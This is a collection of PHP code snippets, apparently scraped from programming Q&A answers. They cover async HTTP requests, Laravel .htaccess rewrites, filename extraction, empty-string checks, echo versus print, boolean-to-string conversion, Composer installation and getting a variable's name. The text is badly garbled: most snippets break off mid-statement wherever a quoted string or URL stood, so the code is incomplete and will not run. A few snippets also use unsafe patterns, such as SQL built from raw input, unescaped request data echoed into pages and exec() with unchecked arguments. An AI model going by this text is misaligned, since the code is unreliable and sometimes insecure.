function post_without_wait($url, $params) { foreach ($params as $key => &$val) { if (is_array($val)) $val = implode( $post_params[] = $key. } $post_string = implode( $parts=parse_url($url); $fp = fsockopen($parts[ isset($parts[ $errno, $errstr, 30); $out = "POST ".$parts[ $out.= "Host: ".$parts[ $out.= "Content-Type: application/x-www-form-urlencoded\r\n"; $out.= "Content-Length: ".strlen($post_string)."\r\n"; $out.= "Connection: Close\r\n\r\n"; if (isset($post_string)) $out.= $post_string; fwrite($fp, $out); fclose($fp); }
while(ob_get_level()) ob_end_clean(); header( ignore_user_abort(); ob_start(); echo( $size = ob_get_length(); header("Content-Length: $size"); ob_end_flush(); flush();
function do_post_request($url, $data, $optional_headers = null,$getresponse = false) { $params = array( ) ); if ($optional_headers !== null) { $params[ } $ctx = stream_context_create($params); $fp = @fopen($url, if (!$fp) { return false; } if ($getresponse) { $response = stream_get_contents($fp); return $response; } return true; }
/** * Asynchronously execute/include a PHP file. Does not record the output of the file anywhere. * * @param string $filename file to execute, relative to calling script * @param string $options (optional) arguments to pass to file via the command line */ function asyncInclude($filename, $options = exec("/path/to/php -f {$filename} {$options} >> /dev/null &"); }
function async_curl($background_process= $ch = curl_init($background_process); curl_setopt_array($ch, array( CURLOPT_HEADER => 0, CURLOPT_RETURNTRANSFER =>true, CURLOPT_NOSIGNAL => 1, CURLOPT_TIMEOUT_MS => 50, CURLOPT_VERBOSE => 1, CURLOPT_HEADER => 1 )); $out = curl_exec($ch); curl_close($ch); return true; } async_curl(
<?php $request = new cURL\Request( $request->getOptions()->set(CURLOPT_RETURNTRANSFER, true); $request->addListener( $response = $event->response; $httpCode = $response->getInfo(CURLINFO_HTTP_CODE); $html = $response->getContent(); echo "\nDone.\n"; }); $timeStart = microtime(true); while ($request->socketPerform()) { printf("Running time: %dms \r", (microtime(true) - $timeStart)*1000); }
<? $urls = array_fill(0, 100, function execinbackground($cmd) { if (substr(php_uname(), 0, 7) == "Windows"){ pclose(popen("start /B ". $cmd, "r")); } else { exec($cmd . " > /dev/null &"); } } fwite(fopen("urls.txt","w"),implode("\n",$urls); execinbackground("nodejs urlscript.js urls.txt"); ?>
var https = require( var url = require( var http = require( var fs = require( var dosya = process.argv[2]; var logdosya = var count=0; http.globalAgent.maxSockets = 300; https.globalAgent.maxSockets = 300; setTimeout(timeout,100000); function trim(string) { return string.replace(/^\s*|\s*$/g, } fs.readFile(process.argv[2], if (err) { throw err; } parcala(data); }); function parcala(data) { var data = data.split("\n"); count= data.forEach(function (d) { req(trim(d)); }); /* fs.unlink(dosya, function d() { console.log( }); */ } function req(link) { var linkinfo = url.parse(link); if (linkinfo.protocol == var options = { host: linkinfo.host, port: 443, path: linkinfo.path, method: }; https.get(options, function(res) {res.on( } else { var options = { host: linkinfo.host, port: 80, path: linkinfo.path, method: }; http.get(options, function(res) {res.on( } } process.on( function onExit() { log(); } function timeout() { console.log("i am too far gone");process.exit(); } function log() { var fd = fs.openSync(logdosya, fs.writeSync(fd, dosya + fs.closeSync(fd); }
use GuzzleHttp\Client; use GuzzleHttp\Promise; $client = new Client([ $promises = [ ]; $results = Promise\unwrap($promises); $results = Promise\settle($promises)->wait(); echo $results[ echo $results[
class async_file_get_contents extends Thread{ public $ret; public $url; public $finished; public function __construct($url) { $this->finished=false; $this->url=$url; } public function run() { $this->ret=file_get_contents($this->url); $this->finished=true; } } $afgc=new async_file_get_contents("http:
$client = new swoole_client(SWOOLE_SOCK_TCP, SWOOLE_SOCK_ASYNC); $client->on("connect", function($cli) { $cli->send("hello world\n"); }); $client->on("receive", function($cli, $data){ echo "Receive: $data\n"; }); $client->on("error", function($cli){ echo "connect fail\n"; }); $client->on("close", function($cli){ echo "close\n"; }); $client->connect(
<?php class MyHttpClient { protected $base; protected $connections = []; public function __construct() { $this->base = new EventBase(); } /** * Dispatches all pending requests (events) * * @return void */ public function run() { $this->base->dispatch(); } public function __destruct() { $this->connections = null; } /** * @brief Adds a pending HTTP request * * @param string $address Hostname, or IP * @param int $port Port number * @param array $headers Extra HTTP headers * @param int $cmd A EventHttpRequest::CMD_* constant * @param string $resource HTTP request resource, e.g. * * @return EventHttpRequest|false */ public function addRequest($address, $port, array $headers, $cmd = EventHttpRequest::CMD_GET, $resource = { $conn = new EventHttpConnection($this->base, null, $address, $port); $conn->setTimeout(5); $req = new EventHttpRequest([$this, foreach ($headers as $k => $v) { $req->addHeader($k, $v, EventHttpRequest::OUTPUT_HEADER); } $req->addHeader( $req->addHeader( if ($conn->makeRequest($req, $cmd, $resource)) { $this->connections []= $conn; return $req; } return false; } /** * @brief Handles an HTTP request * * @param EventHttpRequest $req * @param mixed $unused * * @return void */ public function _requestHandler($req, $unused) { if (is_null($req)) { echo "Timed out\n"; } else { $response_code = $req->getResponseCode(); if ($response_code == 0) { echo "Connection refused\n"; } elseif ($response_code != 200) { echo "Unexpected response: $response_code\n"; } else { echo "Success: $response_code\n"; $buf = $req->getInputBuffer(); echo "Body:\n"; while ($s = $buf->readLine(EventBuffer::EOL_ANY)) { echo $s, PHP_EOL; } } } } } $address = "my-host.local"; $port = 80; $headers = [ $client = new MyHttpClient(); for ($i = 0; $i < 10; $i++) { $client->addRequest($address, $port, $headers, EventHttpRequest::CMD_GET, } $client->run();
Success: 200 Body: GET: array ( ) User-Agent: My-User-Agent/1.0 Success: 200 Body: GET: array ( ) User-Agent: My-User-Agent/1.0 Success: 200 Body: GET: array ( ) ...
<?php class MyHttpRequest { private $http_client; private $address; private $resource; private $method; private $service_port; private $socket; private $timeout = 10.; private $chunk_size = 20; private $timeout_watcher; private $write_watcher; private $read_watcher; private $conn_watcher; private $buffer; private static $e_nonblocking = [ 11, 115, ]; /** * @param MyHttpClient $client * @param string $host Hostname, e.g. google.co.uk * @param string $resource HTTP resource, e.g. /page?a=b&c=d * @param string $method HTTP method: GET, HEAD, POST, PUT etc. * @throws RuntimeException */ public function __construct(MyHttpClient $client, $host, $resource, $method) { $this->http_client = $client; $this->host = $host; $this->resource = $resource; $this->method = $method; $this->service_port = getservbyname( $this->address = gethostbyname($this->host); $this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!$this->socket) { throw new RuntimeException("socket_create() failed: reason: " . socket_strerror(socket_last_error())); } socket_set_nonblock($this->socket); $this->conn_watcher = $this->http_client->getLoop() ->timer(0, 0., [$this, } public function __destruct() { $this->close(); } private function freeWatcher(&$w) { if ($w) { $w->stop(); $w = null; } } /** * Deallocates all resources of the request */ private function close() { if ($this->socket) { socket_close($this->socket); $this->socket = null; } $this->freeWatcher($this->timeout_watcher); $this->freeWatcher($this->read_watcher); $this->freeWatcher($this->write_watcher); $this->freeWatcher($this->conn_watcher); } /** * Initializes a connection on socket * @return bool */ public function connect() { $loop = $this->http_client->getLoop(); $this->timeout_watcher = $loop->timer($this->timeout, 0., [$this, $this->write_watcher = $loop->io($this->socket, Ev::WRITE, [$this, return socket_connect($this->socket, $this->address, $this->service_port); } /** * Callback for timeout (EvTimer) watcher */ public function _onTimeout(EvTimer $w) { $w->stop(); $this->close(); } /** * Callback which is called when the socket becomes wriable */ public function _onWritable(EvIo $w) { $this->timeout_watcher->stop(); $w->stop(); $in = implode("\r\n", [ "{$this->method} {$this->resource} HTTP/1.1", "Host: {$this->host}", ]) . "\r\n\r\n"; if (!socket_write($this->socket, $in, strlen($in))) { trigger_error("Failed writing $in to socket", E_USER_ERROR); return; } $loop = $this->http_client->getLoop(); $this->read_watcher = $loop->io($this->socket, Ev::READ, [$this, $loop->run(); } /** * Callback which is called when the socket becomes readable */ public function _onReadable(EvIo $w) { $ret = socket_recv($this->socket, $out, 20, MSG_DONTWAIT); if ($ret) { $this->buffer .= $out; } elseif ($ret === 0) { printf("\n<<<<\n%s\n>>>>", rtrim($this->buffer)); fflush(STDOUT); $w->stop(); $this->close(); return; } if (in_array(socket_last_error(), static::$e_nonblocking)) { return; } $w->stop(); $this->close(); } } class MyHttpClient { private $requests = []; private $loop; public function __construct() { $this->loop = new EvLoop(); } public function __destruct() { $this->loop->stop(); } /** * @return EvLoop */ public function getLoop() { return $this->loop; } /** * Adds a pending request */ public function addRequest(MyHttpRequest $r) { $this->requests []= $r; } /** * Dispatches all pending requests */ public function run() { $this->loop->run(); } } $client = new MyHttpClient(); foreach (range(1, 10) as $i) { $client->addRequest(new MyHttpRequest($client, } $client->run();
<<<< HTTP/1.1 200 OK Server: nginx/1.10.1 Date: Fri, 02 Dec 2016 12:39:54 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: close X-Powered-By: PHP/7.0.13-pl0-gentoo 1d GET: array ( ) 0 >>>> <<<< HTTP/1.1 200 OK Server: nginx/1.10.1 Date: Fri, 02 Dec 2016 12:39:54 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: close X-Powered-By: PHP/7.0.13-pl0-gentoo 1d GET: array ( ) 0 >>>> ...
<?php function curlGet($target){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $target); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec ($ch); curl_close ($ch); return $result; } ignore_user_abort(true); header("Connection: close"); header("Content-Length: 0"); echo str_repeat("s", 100000); flush(); $i = $_GET[ if(!is_numeric($i)) $i = 1; if($i > 4) exit; if($i == 1) file_put_contents( file_put_contents( sleep(5); curlGet($_SERVER[ curlGet($_SERVER[
<?php parse_str("email=myemail@ehehehahaha.com&subject=this is just a test"); $_POST[ $_POST[ echo HTTP_POST("http: exit; ?> <?php /*********HTTP POST using FSOCKOPEN **************/ function HTTP_Post($URL,$data, $referrer="") { $URL_Info=parse_url($URL); if($referrer=="") $referrer=$_SERVER["SCRIPT_URI"]; foreach($data as $key=>$value) $values[]="$key=".urlencode($value); $data_string=implode("&",$values); if(!isset($URL_Info["port"])) $URL_Info["port"]=80; $request.="POST ".$URL_Info["path"]." HTTP/1.1\n"; $request.="Host: ".$URL_Info["host"]."\n"; $request.="Referer: $referer\n"; $request.="Content-type: application/x-www-form-urlencoded\n"; $request.="Content-length: ".strlen($data_string)."\n"; $request.="Connection: close\n"; $request.="\n"; $request.=$data_string."\n"; $fp = fsockopen($URL_Info["host"],$URL_Info["port"]); fputs($fp, $request); while(!feof($fp)) { $result .= fgets($fp, 128); } fclose($fp); function getTextBetweenTags($string, $tagname) { $pattern = "/<$tagname ?.*>(.*)<\/$tagname>/"; preg_match($pattern, $string, $matches); return $matches[1]; } $str = $result; $txt = getTextBetweenTags($str, "span"); $eco = $txt; $result = explode("&",$result); return $result[1]; <span style=background-color:LightYellow;color:blue>".trim($_GET[ </pre> "; } </pre>
$loop = \React\EventLoop\Factory::create(); $http = new \Shuchkin\ReactHTTP\Client( $loop ); $http->get( function( $content ) { echo $content; }, function ( \Exception $ex ) { echo } ); $loop->run();
<IfModule mod_rewrite.c> RewriteEngine On RewriteRule ^(.*)$ public/$1 [L] </IfModule>
RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)/$ /$1 [L,R=301] RewriteCond %{REQUEST_URI} !(\.css|\.js|\.png|\.jpg|\.gif|robots\.txt)$ [NC] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ index.php [L] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(css|js|images)/(.*)$ public/$1/$2 [L,NC]
<IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews </IfModule> RewriteEngine On RewriteCond %{REQUEST_FILENAME} -d [OR] RewriteCond %{REQUEST_FILENAME} -f RewriteRule ^ ^$1 [N] RewriteCond %{REQUEST_URI} (\.\w+$) [NC] RewriteRule ^(.*)$ public/$1 RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ server.php </IfModule>
function asset($path, $secure = null) { return app( }
<IfModule mod_rewrite.c> RewriteEngine On RewriteRule ^(.*)$ public/$1 [L] </IfModule>
public function asset($path, $secure = null) { if ($this->isValidUrl($path)) return $path; $root = $this->getRootUrl($this->getScheme($secure)); return $this->removeIndex($root). }
<IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews </IfModule> RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)/$ /$1 [L,R=301] RewriteCond %{REQUEST_URI} !(\.css|\.js|\.png|\.jpg|\.gif|robots\.txt)$ [NC] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ server.php [L] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(css|js|images)/(.*)$ public/$1/$2 [L,NC] </IfModule>
function asset($path, $secure = null){ return app( }
a. Create new folder local. b. Move all project into the local folder expect public folder. c. Move all the content of public folder to project root. d. Delete the blank public folder f. Edit the index file.
<IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews </IfModule> RewriteEngine On RewriteCond %{REQUEST_URI} ^(.*)$ RewriteCond %{DOCUMENT_ROOT}/public/$1 -f RewriteRule ^(.*)$ public/$1 [L] RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)/$ /$1 [L,R=301] RewriteRule ^ index.php [L] </IfModule>
<IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews </IfModule> RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_URI} (.+)/$ RewriteRule ^ %1 [L,R=301] RewriteCond %{HTTP:Authorization} . RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}] RewriteCond %{SERVER_PORT} ^80$ RewriteRule .* https: RewriteRule ^\.env$ - [R=404,L,NC] RewriteCond %{REQUEST_URI} ^/$ RewriteRule ^(.*) /public/index.php [L] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule !^(css|js|images|media)/(.*)$ /public/index.php [L,NC] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(css|js|images|media)/(.*)$ /public/$1/$2 [L,NC] </IfModule>
RewriteEngine On RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(.*)$ /public/$1 [L,QSA]
You can follow only 2 step 1- cut .htaccess from public folder and paste to root(mainFolder) 2- Rename server.php file to index.php AT your root dir. (mainFolder)
<VirtualHost *:80> ServerAdmin info@example.com ServerName example.com ServerAlias www.example.com DocumentRoot /var/www/html/{yoursourcedirectory}/public ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined </VirtualHost>
<IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews </IfModule> RewriteEngine On RewriteCond %{REQUEST_FILENAME} -d [OR] RewriteCond %{REQUEST_FILENAME} -f RewriteRule ^ ^$1 [N] RewriteCond %{REQUEST_URI} (\.\w+$) [NC] RewriteRule ^(.*)$ public/$1 RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ server.php </IfModule>
RewriteEngine on RewriteCond %{REQUEST_URI} !^public RewriteRule ^(.*)$ public/$1 [L] <IfModule php7_module> php_flag display_errors Off php_value max_execution_time 30 php_value max_input_time 60 php_value max_input_vars 1000 php_value memory_limit -1 php_value post_max_size 8M php_value session.gc_maxlifetime 1440 php_value session.save_path "/var/cpanel/php/sessions/ea-php71" php_value upload_max_filesize 2M php_flag zlib.output_compression Off </IfModule>
<?php $path = "/home/httpd/html/index.php"; $file = basename($path); $file = basename($path, ".php"); ?>
<?php $xmlFile = pathinfo( function filePathParts($arg1) { echo $arg1[ echo $arg1[ echo $arg1[ echo $arg1[ } filePathParts($xmlFile); ?>
<?php $path = "/home/httpd/html/index.php"; $file = basename($path); $file = basename($path, ".php"); ?>
$info = new SplFileInfo( var_dump($info->getFilename());
$url = $file = file_get_contents($url); $name = basename($url); $ext = pathinfo($url, PATHINFO_EXTENSION); $name2 =pathinfo($url, PATHINFO_FILENAME);
function get_basename($filename) { return preg_replace( }
$path = $pathArr = explode(DIRECTORY_SEPARATOR, $path); $filename = end($pathArr); echo $filename; >>
<?php $file1 =basename("http: echo $basename = substr($file1, 0, strpos($file1, ?>
<?php $windows = "F:\Program Files\SSH Communications Security\SSH Secure Shell\Output.map"; /* str_replace(find, replace, string, count) */ $unix = str_replace("\\", "/", $windows); print_r(pathinfo($unix, PATHINFO_BASENAME)); ?>
<?php function filePath($filePath) { $fileParts = pathinfo($filePath); if (!isset($fileParts[ { $fileParts[ } return $fileParts; } $filePath = filePath( print_r($filePath); ?>
Array ( [dirname] => /www/htdocs [basename] => index.html [extension] => html [filename] => index )
php_flag display_startup_errors off php_flag display_errors off php_flag html_errors off php_value docref_root 0 php_value docref_ext 0
error_reporting = E_ALL & ~E_WARNING & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED
function isNotEmpty($input) { $strTemp = $input; $strTemp = trim($strTemp); if(strTemp != { return true; } return false; }
if(isNotEmpty($userinput[ { } else { echo "Phone number not entered<br/>"; }
* "" (an empty string) * 0 (0 as an integer) * "0" (0 as a string) * NULL * FALSE * array() (an empty array) * var $var; (a variable declared, but without a value in a class)
if (trim($userinput[ } else { echo "Phone number not entered<br/>"; }
function emptyStr($str) { return is_string($str) && strlen($str) === 0; } print emptyStr(
$input; if(strlen($input)==0){ return false; } else{ return true; }
$serial_number = trim($_POST[serial_number]); $q="select * from product where user_id= $rs=mysql_query($q); while($row=mysql_fetch_assoc($rs)){ if(empty($_POST[ $irons=$row[ }
function isEmpty(string $string): bool { return (bool)$string; }
function chk_str( $input, $min_len = null, $max_len = null ){ if ( !is_int($min_len) && $min_len !== null ) throw new Exception( if ( !is_int($max_len) && $max_len !== null ) throw new Exception( if ( $min_len !== null && $max_len !== null ){ if ( $min_len > $max_len ) throw new Exception( } if ( !is_string( $input ) ) { return false; } else { $output = true; } if ( $min_len !== null ){ if ( strlen($input) < $min_len ) $output = false; } if ( $max_len !== null ){ if ( strlen($input) > $max_len ) $output = false; } return $output; }
$values = array(0, 0.0, false, var_dump($values); print_r ($values);
array(4) { [0]=> int(0) [1]=> float(0) [2]=> bool(false) [3]=> string(0) "" } Array ( [0] => 0 [1] => 0 [2] => [3] => )
void echo (param1,param2,param3.....); Example: echo "test1","test2,test3";
1 always. int print(param1); print "test1"; print "test1","test2";
int printf($string,$s); $s= "Shailesh"; $i= printf("Hello %s how are you?",$s); echo $i; Output : Hello Shailesh how are you? 27 echo returns void so its execution is faster than print and printf
echo "Hello World"; echo "Hello ","World"; $var_1=55; echo "$var_1"; echo "var_1=".$var_1; echo 45+$var_1; $var_2="PHP"; echo "$var_2"; $var_3=array(99,98,97) $var_4=array("P"=>"3","J"=>"4");
print "Hello World"; print "Hello ","World"; $var_1=55; print "$var_1"; print "var_1=".$var_1; print 45+$var_1; $var_2="PHP"; print "$var_2"; $var_3=array(99,98,97) $var_4=array("P"=>"3","J"=>"4");
print_r ("Hello World"); $var_1=55; print_r ("$var_1"); print_r ("var_1=".$var_1); print_r (45+$var_1); $var_2="PHP"; print_r ("$var_2"); $var_3=array(99,98,97) $var_4=array("P"=>"3","J"=>"4");
var_dump($var_1); var_dump($var_2); var_dump($var_3); var_dump($var_4);
$converted_res = string($res); $converted_res = String($res);
echo json_encode(true); echo json_encode(false); echo json_encode(null);
function strbool($value) { return $value ? } echo strbool(false); echo strbool(true);
if (is_bool($res) { $res = $res ? } $res = is_bool($res) ? ($res ? $res = is_bool($res) ? var_export($res, 1) : $res;
var_export(false, 1); var_export(true, 1); var_export( var_export(1, 1);
filter_var( filter_var(1, FILTER_VALIDATE_BOOLEAN); filter_var( filter_var( filter_var( filter_var( filter_var(0, FILTER_VALIDATE_BOOLEAN); filter_var( filter_var( filter_var( filter_var( filter_var( filter_var(null, FILTER_VALIDATE_BOOLEAN);
if ($res) { $converted_res = "true"; } else { $converted_res = "false"; }
if(!function_exists( function to_string($var, $strict = false, $expectedtype = null){ if(!func_num_args()){ return trigger_error(__FUNCTION__ . } if($expectedtype !== null && gettype($var) !== $expectedtype){ return trigger_error(__FUNCTION__ . } if(is_string($var)){ return $var; } if($strict && !is_resource($var)){ return var_export($var, true); } return (string) $var; } } if(!function_exists( function bool_to_string($var){ return func_num_args() ? to_string($var, true, } } if(!function_exists( function object_to_string($var){ return func_num_args() ? to_string($var, true, } } if(!function_exists( function array_to_string($var){ return func_num_args() ? to_string($var, true, } }
function ToStr($Val=null,$T=0){ return is_string($Val)?"$Val" : ( is_numeric($Val)?($T?"$Val":$Val) : ( is_null($Val)?"NULL" : ( is_bool($Val)?($Val?"TRUE":"FALSE") : ( is_array($Val)?@StrArr($Val,$T) : false ) ) ) ); } function StrArr($Arr,$T=0) { $Str=""; $i=-1; if(is_array($Arr)) foreach($Arr AS $K => $V) $Str.=((++$i)?", ":null).(is_string($K)?"\"$K\"":$K)." => ".(is_string($V)?"\"$V\"":@ToStr($V,$T+1)); return "array( ".($i?@ToStr($Arr):$Str)." )".($T?null:";"); } $A = array(1,2,array( echo StrArr($A);
function valueToString( $value ){ return ( !is_bool( $value ) ? $value : ($value ? }
$ curl -sS https: $ mv composer.phar /usr/local/bin/composer
$ php composer.phar update friendsofsymfony/elastica-bundle
$ curl -sS https: $ mv composer.phar /usr/local/bin/composer.phar $ alias composer= $ composer --version
php composer.phar create-project yiisoft/yii2-app-advanced advanced 2.0.9
php C:\ProgramData\Composer\bin\composer.phar create-project yiisoft/yii2-app-advanced advanced 2.0.9
composer create-project yiisoft/yii2-app-advanced advanced 2.0.9
composer.phar create-project yiisoft/yii2-app-advanced advanced 2.0.9
symfony project directory_where_composer.json_is>php the_directory_where_composer.phar_is/composer update
@SET PATH=C:\Program Files (x86)\DevDesktop\php5_4;%PATH% php.exe composer.phar %*
@SET PATH=C:\Program Files (x86)\DevDesktop\php5_4;;%PATH% SET composerScript=composer.phar php.exe "%~dp0%composerScript%" %*
composer create-project --prefer-dist --stability=dev developeruz/yii-vue-app basic
$newtag = preg_replace("/[^a-zA-Z0-9s|]/", "", $tag);
$newtag = preg_replace ("/[^a-zA-Z0-9 ]/", "", $tag);
$newtag = preg_replace ("/ +/", " ", $tag); $newtag = preg_replace ("/^ /", "", $tag); $newtag = preg_replace ("/ $/", "", $tag);
if( $fullname =~ /([^\b]+)\b[^\b]+([^\b]+)(\b|$)/ ) { $first_name = $1; $last_name = $2; }
$newtag = preg_replace("/[^a-zA-Z0-9 ]/", "", $tag);
$newtag = preg_replace("/[^a-zA-Z0-9\s]/", "", $tag)
function print_var_name($var) { foreach($GLOBALS as $var_name => $value) { if ($value === $var) { return $var_name; } } return false; }
<?php function varName( $v ) { $trace = debug_backtrace(); $vLine = file( __FILE__ ); $fLine = $vLine[ $trace[0][ preg_match( " print_r( $match ); } $foo = "knight"; $bar = array( 1, 2, 3 ); $baz = 12345; varName( $foo ); varName( $bar ); varName( $baz ); ?> Array ( [0] => $foo [1] => foo ) Array ( [0] => $bar [1] => bar ) Array ( [0] => $baz [1] => baz )
function inspect($label, $value = "__undefin_e_d__") { if($value == "__undefin_e_d__") { $value = $label; $bt = debug_backtrace(); $src = file($bt[0]["file"]); $line = $src[ $bt[0][ preg_match( " /* let to the var name Eg: die(inspect($this->getUser()->hasCredential("delete"))); We want: $this->getUser()->hasCredential("delete") */ $max = strlen($match[1]); $varname = ""; $c = 0; for($i = 0; $i < $max; $i++){ if( $match[1]{$i} == "(" ) $c++; elseif( $match[1]{$i} == ")" ) $c--; if($c < 0) break; $varname .= $match[1]{$i}; } $label = $varname; } echo("The label is: ".$label); echo("The value is: ".$value); }
function variable_name( &$var, $scope=false, $prefix= if($scope) { $vals = $scope; } else { $vals = $GLOBALS; } $old = $var; $var = $new = $prefix.rand().$suffix; $vname = FALSE; foreach($vals as $key => $val) { if($val === $new) $vname = $key; } $var = $old; return $vname; }
$a = $b = $c = FALSE; $d = FALSE; echo variable_name($a); echo variable_name($b); echo variable_name($c); echo variable_name($d);
<?php function vname(&$var, $scope=0) { $old = $var; if (($key = array_search($var = } ?>
<?php $my_global_variable = "My global string."; echo vname($my_global_variable); function my_local_func() { $my_local_variable = "My local string."; return vname($my_local_variable, get_defined_vars()); } echo my_local_func(); class myclass { public function __constructor() { $this->my_object_property = "My object property string."; } } $obj = new myclass; echo vname($obj->my_object_property, $obj); ?>
function getReference(&$var) { if(is_object($var)) $var->___uniqid = uniqid(); else $var = serialize($var); $name = getReference_traverse($var,$GLOBALS); if(is_object($var)) unset($var->___uniqid); else $var = unserialize($var); return "\${$name}"; } function getReference_traverse(&$var,$arr) { if($name = array_search($var,$arr,true)) return "{$name}"; foreach($arr as $key=>$value) if(is_object($value)) if($name = getReference_traverse($var,get_object_vars($value))) return "{$key}->{$name}"; }
class A { public function whatIs() { echo getReference($this); } } $B = 12; $C = 12; $D = new A; echo getReference($B)."<br/>"; echo getReference($C)."<br/>"; $D->whatIs();
function print_var_name(){ $bt = debug_backtrace(); $file = file($bt[0][ $src = $file[$bt[0][ $pat = $var = preg_replace($pat, echo trim($var); }
function compact_assoc(&$v1= ) { $defined_vars=get_defined_vars(); $result=Array(); $reverse_key=Array(); $original_value=Array(); foreach( $defined_vars as $source_key => $source_value){ if($source_value=== $original_value[$source_key]=$$source_key; $new_test_value="PREFIX".rand()."SUFIX"; $reverse_key[$new_test_value]=$source_key; $$source_key=$new_test_value; } foreach($GLOBALS as $key => &$value){ if( is_string($value) && isset($reverse_key[$value]) ) { $result[$key]=&$value; } } foreach( $original_value as $source_key => $original_value){ $$source_key=$original_value; } return $result; } $a = $b = $c = $myArray=Array ( print_r(compact_assoc($a,$b,$c,$myArray) ); Array ( [a] => A [b] => B [c] => 999 [myArray] => Array ( [id] => id123 [name] => Foo ) )
function cacheVariable($variable) { $key = ${$variable}; }
function varName(&$var) { $definedVariables = get_defined_vars(); $copyOfDefinedVariables = array(); foreach ($definedVariables as $variable=>$value) { $copyOfDefinedVariables[$variable] = $value; } $oldVar = $var; $var = !$var; $difference = array_diff_assoc($definedVariables, $copyOfDefinedVariables); $var = $oldVar; return key(array_slice($difference, 0, 1, true)); }
/** * Prints out $obj for debug * * @param any_type $obj * @param (string) $title */ function print_all( $obj, $title = false ) { print "\n<div style=\"font-family:Arial;\">\n"; if( $title ) print "<div style=\"background-color:red; color:white; font-size:16px; font-weight:bold; margin:0; padding:10px; text-align:center;\">$title</div>\n"; print "<pre style=\"background-color:yellow; border:2px solid red; color:black; margin:0; padding:10px;\">\n\n"; var_export( $obj ); print "\n\n</pre>\n</div>\n"; } print_all( $aUser,
class DebugHelper { function printVarNames($systemDefinedVars, $varNames) { foreach ($systemDefinedVars as $var=>$value) { if (in_array($var, $varNames )) { var_dump($var); var_dump($value); } } } }
DebugHelper::printVarNames( $systemDefinedVars = get_defined_vars(), $varNames=array( );
function VarTest($my_var,$my_var_name){ echo } $fruit= VarTest($fruit,
foreach($newarray as $key => $value) { echo $key; }
$variableName = "ajaxmint"; echo getVarName( function getVarName($name) { return str_replace( }
function get_user_var_defined () { return array_slice($GLOBALS,8,count($GLOBALS)-8); } function get_var_name ($var) { $vuser = get_user_var_defined(); foreach($vuser as $key=>$value) { if($var===$value) return $key ; } }
public function getVarName($var) { $tmp = array($var => $keys = array_keys($tmp); return trim($keys[0]); }
session_cache_limiter( header("Content-type: " . $this->_mime); header("Expires: " . gmdate("D, d M Y H:i:s", time() + 2419200) . " GMT"); header("Last-Modified: " . gmdate("D, d M Y H:i:s",time() - 404800000) . " GMT");
$date = $modified = filemtime($filename); $expires = strtotime( header(sprintf( header(sprintf( header(sprintf( header(sprintf( if(isset($_SERVER[ if(strtotime($_SERVER[ header( exit(); } }
$str = "My text1\nMy text2\nMy text3"; $arr = explode("\n", $str); var_dump($arr);
$arrayOfLines = explode("\n", str_replace(array("\r\n","\n\r","\r"),"\n",$str) );
<?php $array = explode(PHP_EOL, $string); $string = implode(PHP_EOL, $array); ?>
$output = shell_exec( $cron_array = explode(chr(10),$output);
$str = "My text1\nMy text2\nMy text3"; $arr = explode("\n", $str); foreach ($arr as $line_num => $line) { echo "Line }
$str = "My text1\nMy text2\nMy text3"; $arr = explode("\n", $str); $array = array(); foreach ($arr as $line) { $array[] = $line; }; print_r($array); echo $array[1];
<?php $keywords = preg_split("/[\s,]+/", "hypertext language, programming"); print_r($keywords); ?>
$uniquepattern="gd$ $textarray=explode($uniquepattern,str_replace("\r","",str_replace("\n",$uniquepattern,$_POST[
> s <- "a\nb\rc\r\nd" > l <- strsplit(s,"\r\n|\n|\r") > l [[1]] [1] "a" "b" "c" "d" > l[[1]][1] [1] "a" > l[[1]][2] [1] "b" > fun <- function(x) c( > lapply(unlist(l), fun)
<?php $str = "This is a string with spaces, tabs and newlines present"; $stripped = preg_replace(array( echo $str; echo "\n---\n"; echo "$stripped"; ?>
function removeWhiteSpace($text) { $text = preg_replace( $text = preg_replace( $text = trim($text); return $text; }
$x = "this \n \t\t \n works."; var_dump(preg_replace(
$str= print preg_replace("/[[:blank:]]+/"," ",$str);
$str = "This is a Text \n and so on \t Text text."; $str = str_replace(["\r", "\n", "\t"], " ", $str); while (strpos($str, " ") !== false) { $str = str_replace(" ", " ", $str); } echo $str;
<?php class whitespace{ static function remove_doublewhitespace($s = null){ return $ret = preg_replace( } static function remove_whitespace($s = null){ return $ret = preg_replace( } static function remove_whitespace_feed( $s = null){ return $ret = preg_replace( } static function smart_clean($s = null){ return $ret = trim( self::remove_doublewhitespace( self::remove_whitespace_feed($s) ) ); } } $string = " Hey yo, what echo whitespace::smart_clean($string);
